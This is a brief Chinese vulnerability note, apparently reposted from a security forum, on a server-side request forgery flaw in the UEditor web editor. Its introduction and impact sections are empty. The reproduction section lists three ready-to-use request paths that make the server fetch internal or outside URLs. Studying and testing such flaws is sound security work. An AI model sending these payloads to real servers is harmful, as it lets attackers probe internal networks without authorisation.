# ueditor ssrf

> 原文：[https://www.zhihuifly.com/t/topic/3206](https://www.zhihuifly.com/t/topic/3206)

# ueditor ssrf

## 一、漏洞简介

## 二、漏洞影响

## 三、复现过程

存在漏洞路径：

```
/ueditor/jsp/getRemoteImage.jsp?upfile=http://127.0.0.1/favicon.ico?.jpg

/ueditor/jsp/controller.jsp?action=catchimage&source[]=https://www.baidu.cimg/baidu_jgylogo3.gif

/ueditor/php/controller.php?action=catchimage&source[]=https://www.baidu.cimg/baidu_jgylogo3.gif `存在就会抓取成功、也可以抓取外网的测试` 
```